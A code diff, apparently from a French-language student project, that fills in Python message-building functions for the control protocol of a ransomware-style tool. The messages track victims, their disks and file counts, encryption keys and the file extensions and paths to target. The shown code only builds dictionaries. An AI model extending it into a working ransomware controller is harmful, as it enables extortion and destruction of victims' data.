@@ -18,14 +18,7 @@ INITIALIZE_KEY = {'KEY_RESP': 0, 'KEY': '', 'STATE': ''}
 INITIALIZE_RESP = {'CONFIGURE': 0, 'SETTING': {'DISKS': [], 'PATHS': [], 'FILE_EXT': [], 'FREQ': 0, 'KEY': ''}}
 
 # message_type
-MESSAGE_TYPE = {
-    'LIST_REQ': 'LIST_VICTIM_REQ',
-    'VICTIM': 'LIST_VICTIM_RESP',
-    'LIST_END': 'LIST_VICTIM_END',
-    'HIST_REQ': 'HISTORY_REQ',
-    'HIST_RESP': 'HISTORY_RESP',
-    'HIST_END': 'HISTORY_END',
-    'CHGSTATE': 'CHANGE_STATE',
+MESSAGE_TYPE = {'LIST_REQ': 'LIST_VICTIM_REQ', 'VICTIM': 'LIST_VICTIM_RESP','LIST_END': 'LIST_VICTIM_END','HIST_REQ': 'HISTORY_REQ','HIST_RESP': 'HISTORY_RESP','HIST_END': 'HISTORY_END', 'CHGSTATE': 'CHANGE_STATE',
     'INITIALIZE': 'INITIALIZE_REQ',
     'KEY_RESP': 'INITIALIZE_KEY',
     'CONFIGURE': 'INITIALIZE_RESP'
@@ -41,31 +34,58 @@ def set_message(select_msg, params=None):
     """
     if select_msg.upper() == 'LIST_VICTIM_REQ':
         return LIST_VICTIM_REQ
+
     if select_msg.upper() == 'LIST_VICTIM_RESP':
+        # dans les param il va inserer une liste [..,..,..] donc la premiere position ça doit etre la
+        LIST_VICTIM_RESP['VICTIM'] = params[0]
+        LIST_VICTIM_RESP['HASH'] = params[1]
+        LIST_VICTIM_RESP['OS'] = params[2]
+        LIST_VICTIM_RESP['DISKS'] = params[3]
+        LIST_VICTIM_RESP['STATE'] = params[4]
+        LIST_VICTIM_RESP['NB_FILES'] = params[5]
         return LIST_VICTIM_RESP
-    # à compléter
+
     if select_msg.upper() == 'LIST_VICTIM_END':
         return LIST_VICTIM_END
 
     if select_msg.upper() == 'HISTORY_REQ':
+        HISTORY_REQ['HIST_REQ'] = params[0]
         return HISTORY_REQ
 
     if select_msg.upper() == 'HISTORY_RESP':
+        HISTORY_RESP['HIST_RESP'] = params[0]
+        HISTORY_RESP['TIMESTAMP'] = params[1]
+        HISTORY_RESP['STATE'] = params[2]
+        HISTORY_RESP['NB_FILES'] = params[3]
         return HISTORY_RESP
 
     if select_msg.upper() == 'HISTORY_END':
+        HISTORY_END['HIST_END'] = params[0]
         return HISTORY_END
 
     if select_msg.upper() == 'CHANGE_STATE':
+        CHANGE_STATE['CHGSTATE'] = params[0]
         return CHANGE_STATE
 
     if select_msg.upper() == 'INITIALIZE_REQ':
+        INITIALIZE_REQ['INITIALIZE'] = params[0]
+        INITIALIZE_REQ['OS'] = params[1]
+        INITIALIZE_REQ['DISKS'] = params[2]
         return INITIALIZE_REQ
 
     if select_msg.upper() == 'INITIALIZE_KEY':
+        INITIALIZE_KEY['KEY_RESP'] = params[0]
+        INITIALIZE_KEY['KEY'] = params[1]
+        INITIALIZE_KEY['STATE'] = params[2]
         return INITIALIZE_KEY
 
     if select_msg.upper() == 'INITIALIZE_RESP':
+        INITIALIZE_RESP['CONFIGURE'] = params[0]
+        INITIALIZE_RESP['SETTING']['DISKS'] = params[1]
+        INITIALIZE_RESP['SETTING']['PATHS'] = params[2]
+        INITIALIZE_RESP['SETTING']['FILE_EXT'] = params[3]
+        INITIALIZE_RESP['SETTING']['FREQ'] = params[4]
+        INITIALIZE_RESP['SETTING']['KEY'] = params[5]
         return INITIALIZE_RESP
 
 def get_message_type(message):
@@ -74,3 +94,6 @@ def get_message_type(message):
     :param message: le dictionnaire représentant le message
     :return: une chaine correspondant au nom du message comme définit par le protocole
     """
+    list_key = [i for i in message]
+    key_first = list_key[0]
+    return MESSAGE_TYPE[key_first]
